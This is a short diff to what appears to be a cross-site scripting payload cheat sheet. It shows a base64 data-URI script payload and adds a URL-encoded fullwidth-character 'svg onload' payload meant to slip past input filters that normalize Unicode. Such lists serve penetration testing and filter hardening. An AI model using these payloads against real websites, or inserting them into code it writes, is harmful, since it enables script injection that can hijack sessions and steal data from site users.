@@ -48,7 +48,8 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgiYnkgc3RydWt0Iik8L3NjcmlwdD4=  //alert(
 
 http://www.utf8-chartable.de/unicode-utf8-table.pl?start=65280&number=128
 //The above link points to the UTF-8 fullwidth character transformations,
-useful if the server translates them to regular characters.
+useful if the server translates them to regular characters.This is an example
+%CA%BA>%EF%BC%9Csvg/onload%EF%BC%9Dalert%EF%BC%881)>
                                                        
 /*To bypass input values*/
 
